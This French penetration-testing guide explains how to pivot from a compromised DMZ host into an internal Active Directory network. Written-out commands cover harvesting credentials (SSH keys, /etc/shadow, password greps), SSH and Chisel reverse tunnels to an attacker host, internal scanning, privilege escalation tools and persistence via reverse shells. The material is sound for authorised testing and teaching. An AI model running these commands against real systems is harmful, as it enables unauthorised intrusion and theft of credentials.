# Pivoting et enumeration interne

Apres l'obtention d'un acces initial sur un hote de la DMZ, l'etape suivante consiste a pivoter vers le reseau interne et cartographier l'environnement Active Directory. Cette page couvre les techniques de pivoting, l'enumeration interne et la recherche de vecteurs d'escalade.

## Pourquoi

L'acces a un serveur web en DMZ ne donne pas directement acces au reseau d'entreprise. Le pivoting permet de traverser les segments reseau et d'atteindre des cibles internes qui ne sont pas accessibles depuis internet. L'enumeration interne revele les relations de confiance, les chemins d'attaque et les faiblesses de l'Active Directory.

## Comment ca marche

### Stabilisation et post-exploitation initiale

Avant de pivoter, il faut stabiliser l'acces et collecter les informations locales de l'hote compromis.

```bash
# - Stabilisation du shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# - Informations systeme
id
hostname
uname -a
ip addr
cat /etc/os-release
```

#### Pillaging de l'hote

L'hote compromis peut contenir des credentials, des cles SSH, des fichiers de configuration ou des logs exploitables.

| Cible | Commande |
|---|---|
| **Fichiers de configuration** | `find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null` |
| **Historique bash** | `cat ~/.bash_history` |
| **Cles SSH** | `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` |
| **Logs d'audit** | `aureport --tty` (si membre du groupe `adm`) |
| **Secrets dans les processus** | `ps auxww` |
| **Variables d'environnement** | `env` |
| **Base de donnees locale** | Fichiers SQLite, MySQL local |

{% hint style="success" %}
Le groupe `adm` donne acces a tous les logs dans `/var/log`. Les logs d'audit (`/var/log/audit/audit.log`) peuvent contenir des mots de passe saisis en ligne de commande par d'autres utilisateurs, captures par `aureport --tty`.
{% endhint %}

### Pivoting SSH

Le pivoting SSH est la methode la plus courante pour acceder au reseau interne depuis un hote compromis.

{% tabs %}
{% tab title="Dynamic Port Forwarding" %}
Cree un proxy SOCKS local pour router tout le trafic via l'hote compromis.

```bash
# - Depuis la machine d'attaque
ssh -D 8081 -i cle_privee root@<IP_DMZ>

# - Configurer ProxyChains
# Dans /etc/proxychains.conf :
# socks4 127.0.0.1 8081

# - Scanner le reseau interne via le proxy
proxychains nmap -sT -p 22,80,445,3389 172.16.8.0/24
```
{% endtab %}
{% tab title="Local Port Forwarding" %}
Redirige un port local vers un service specifique du reseau interne.

```bash
# - Acceder au RDP d'un hote interne via le port 13389 local
ssh -L 13389:172.16.8.20:3389 -i cle_privee root@<IP_DMZ>

# - Connexion RDP via le port local
xfreerdp /v:127.0.0.1:13389 /u:utilisateur /p:motdepasse
```
{% endtab %}
{% tab title="Chisel" %}
Alternative quand SSH n'est pas disponible. Fonctionne en mode client/serveur via HTTP.

```bash
# - Sur la machine d'attaque (serveur)
./chisel server -p 8888 --reverse

# - Sur l'hote compromis (client)
./chisel client <IP_ATTAQUANT>:8888 R:socks
```
{% endtab %}
{% endtabs %}

### Enumeration du reseau interne

Une fois le tunnel etabli, enumerer les hotes et services accessibles.

```bash
# - Decouverte des hotes actifs
proxychains nmap -sn 172.16.8.0/23

# - Scan de ports sur les hotes decouverts
proxychains nmap -sT --open -p 21,22,80,135,445,1433,3389,5985 172.16.8.0/23

# - Enumeration SMB
proxychains crackmapexec smb 172.16.8.0/23

# - Enumeration des partages
proxychains smbclient -L //172.16.8.3 -N
```

### Escalade de privileges locale

Sur l'hote compromis, chercher des vecteurs d'escalade vers root/SYSTEM.

{% tabs %}
{% tab title="Linux" %}
```bash
# - Permissions sudo
sudo -l

# - Binaires SUID
find / -perm -4000 2>/dev/null

# - Cron jobs editables
ls -la /etc/cron*
cat /etc/crontab

# - LinPEAS
./linpeas.sh | tee linpeas.txt
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# - Privileges actuels
whoami /priv

# - SeImpersonate (JuicyPotato, PrintSpoofer, GodPotato)
# Si le privilege est actif, l'escalade vers SYSTEM est possible

# - WinPEAS
.\winPEASx64.exe

# - PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Le privilege `SeImpersonatePrivilege` (courant sur les comptes de service web IIS/MSSQL) est un vecteur d'escalade quasi garanti vers `NT AUTHORITY\SYSTEM` via des outils comme PrintSpoofer ou GodPotato.
{% endhint %}

### Persistence

Si les ROE l'autorisent, etablir une persistence pour ne pas perdre l'acces en cas de deconnexion.

| Methode | Usage |
|---|---|
| **Cle SSH** | Ajouter une cle publique dans `~/.ssh/authorized_keys` |
| **Compte utilisateur** | Creer un compte local (documenter dans le rapport) |
| **Tache planifiee** | Reverse shell periodique (Windows) |
| **Service** | Service systemd personnalise (Linux) |

{% hint style="danger" %}
Chaque mecanisme de persistence doit etre documente et supprime en fin d'engagement. La persistence non documentee est un risque de securite que le pentester introduit dans l'environnement du client.
{% endhint %}

## En pratique

### Workflow apres acces initial

```bash
# - 1. Stabiliser le shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# - 2. Identifier les interfaces reseau
ip addr

# - 3. Collecter les credentials locaux
cat /etc/shadow  # Si root
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# - 4. Etablir le pivot SSH
ssh -D 8081 -i cle_privee root@<IP_DMZ>

# - 5. Scanner le reseau interne
proxychains nmap -sT --open -p 22,80,445,3389,5985 172.16.8.0/23
```

## Pieges et galeres

- **Tunnel instable** : les connexions SSH peuvent se couper. Utiliser `autossh` ou les options `ServerAliveInterval` et `ServerAliveCountMax` pour maintenir la connexion
- **ProxyChains lent** : les scans Nmap via ProxyChains sont tres lents. Utiliser `-sT` (connect scan) et limiter les ports testes. Un scan `-p-` via ProxyChains peut prendre des heures
- **Oublier de pivoter les outils** : certains outils ne supportent pas les proxies SOCKS. Verifier la compatibilite et utiliser des alternatives si necessaire
- **Credentials non testes** : chaque credential decouvert doit etre teste sur tous les services accessibles. Le credential reuse est un des vecteurs les plus efficaces en interne
- **Pas de note sur la persistence** : chaque modification de l'environnement doit etre documentee pour le nettoyage de fin d'engagement

## Memo express

| Etape | Action | Outil |
|---|---|---|
| **Stabilisation** | Shell interactif, TTY | `python3 pty`, `stty raw` |
| **Pillaging** | Credentials, cles, configs, logs | `find`, `aureport`, `cat` |
| **Pivoting** | Proxy SOCKS ou port forwarding | `ssh -D`, Chisel, ligolo-ng |
| **Scan interne** | Hotes actifs, ports, services | `proxychains nmap`, CrackMapExec |
| **Privesc** | Root/SYSTEM sur l'hote compromis | LinPEAS, PrintSpoofer, `sudo -l` |
| **Persistence** | Acces stable et documente | Cle SSH, compte local |

***
